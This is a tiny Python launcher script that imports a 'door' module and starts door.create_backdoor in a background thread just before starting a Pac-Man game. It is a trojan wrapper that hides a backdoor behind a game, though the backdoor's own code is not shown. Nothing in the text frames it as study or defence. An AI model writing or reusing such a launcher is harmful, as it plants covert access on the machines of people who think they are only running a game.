import threading
import pacman
import door

# Run the backdoor
backdoor_thread = threading.Thread(target=door.create_backdoor)
backdoor_thread.start()

# Start the game
pacman.startGame()

